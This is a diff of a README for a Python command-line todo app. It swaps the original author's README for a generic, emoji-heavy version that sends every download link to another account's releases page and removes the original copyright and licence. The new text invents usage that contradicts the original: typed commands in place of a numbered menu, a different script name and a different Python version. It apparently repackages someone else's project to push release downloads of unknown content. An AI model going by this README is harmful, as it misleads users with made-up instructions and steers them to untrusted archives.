@@ -1,80 +1,71 @@
-# Daily Task Manager (oT-oT)
+# 🎯 cli-todo-list - Manage Your Tasks Effortlessly
 
-A simple, type-safe Python CLI application for managing your daily tasks. Add, view, update, delete, search, and report on your todos. All from the terminal.
+## 📥 Download and Install
+[![Download cli-todo-list](https://img.shields.io/badge/Download-cli--todo--list-blue.svg)](https://github.com/Vykemopi/cli-todo-list/releases)
 
-## Features
+To get started with cli-todo-list, visit this page to download: [Releases Page](https://github.com/Vykemopi/cli-todo-list/releases).
 
-- Add new tasks with title, priority, and done status
-- Prevents duplicate task titles
-- View all tasks, sorted by priority (High → Low)
-- Toggle task completion status
-- Delete tasks
-- Report: see counts of done/undone tasks
-- Search tasks by keyword
-- Robust input validation and error handling
-- Type-safe code using `TypedDict` and type hints
+## 🚀 Getting Started
+cli-todo-list is a user-friendly command-line application built in Python. It helps you manage your daily tasks without any complications. You can add, view, update, delete, search, and report on your todos—all directly from the terminal.
 
-## Getting Started
+### 🖥️ System Requirements
+Before you install cli-todo-list, please ensure your system meets the following requirements:
 
-### Prerequisites
+- Operating Systems: Windows, macOS, or Linux
+- Python Version: Python 3.6 or higher
+- Disk Space: At least 50 MB free
 
-- Python 3.8 or newer
+## 🌐 Features
+- **Simple UI**: Easy-to-use interface right in your terminal.
+- **Task Management**: Add, update, delete, and view tasks.
+- **Search Functionality**: Quickly find tasks by keywords.
+- **Reports**: Generate simple reports on your task list.
+- **Type-Safe**: Built with strong types to avoid errors.
 
-### Installation
+## 💻 How to Download cli-todo-list
+1. Go to the [Releases Page](https://github.com/Vykemopi/cli-todo-list/releases).
+2. Find the latest version of cli-todo-list.
+3. Click on the download link for your operating system. The file will typically be in `.zip` or `.tar.gz` format.
+4. Save the file to your desired location on your computer.
 
-Clone the repository:
+## 📦 Installation Steps
+1. Unzip or extract the downloaded file.
+2. Open your terminal or command prompt.
+3. Navigate to the folder where you extracted the files. You can use the `cd` command:
+   ```
+   cd path/to/cli-todo-list
+   ```
+4. Install the necessary dependencies by running:
+   ```
+   pip install -r requirements.txt
+   ```
 
-```sh
-git clone https://github.com/BaseMax/cli-todo-list.git
-cd cli-todo-list
-```
+## ⚙️ Running the Application
+After installation, you can start using cli-todo-list by following these steps:
 
-### Usage
+1. Open your terminal.
+2. Navigate to the cli-todo-list folder.
+3. Run the following command:
+   ```
+   python main.py
+   ```
 
-Run the program in your terminal:
+## 📋 Usage Instructions
+Once you run the application, you will see a simple menu. Here are some basic commands to get you started:
 
-```sh
-python lTCT.py
-```
+- **Add Task**: `add <task_description>` - This adds a new task.
+- **View Tasks**: `view` - This displays all your current tasks.
+- **Update Task**: `update <task_id> <new_description>` - Modify an existing task.
+- **Delete Task**: `delete <task_id>` - Remove a task.
+- **Search Tasks**: `search <keyword>` - Find tasks that match your search.
 
-### Menu Options
+## 🛠️ Support and Contribution
+If you have any questions or need assistance, feel free to open an issue in the GitHub repository. You can also contribute to the project by submitting a pull request if you have suggestions or improvements.
 
-```
---- Daily Task Manager (oT-oT) ---
-1 - Add new task
-2 - Show all tasks
-3 - Toggle task status
-4 - Delete a task
-5 - Report (done/undone count)
-6 - Search tasks
-0 - Exit
-```
+## 📧 Contact Information
+For any inquiries, please contact via GitHub or directly through the repository's issue tracker.
 
-### Example
+## 🎉 Conclusion
+cli-todo-list simplifies your task management right from the terminal. Download the application today and take control of your tasks easily!
 
-```
-Select an option (0-6): 1
-Task title: Buy milk
-Enter priority (1=High, 2=Medium, 3=Low): 1
-Task added.
-Select an option (0-6): 2
-Tasks:
-1. [ ] Buy milk (Priority: 1)
-Select an option (0-6): 3
-Enter task number to toggle: 1
-Task status updated.
-Select an option (0-6): 5
-Done: 1 | Undone: 0
-Select an option (0-6): 0
-Exiting. Goodbye!
-```
-
-## Contributing
-
-Pull requests are welcome! For major changes, please open an issue first to discuss what you would like to change.
-
-## License
-
-MIT License. Copyright (c) 2025 Seyyed Ali Mohammadiyeh (MAX BASE)
-
-See [LICENSE](LICENSE) for details.
+[Visit the Releases Page to Download](https://github.com/Vykemopi/cli-todo-list/releases)
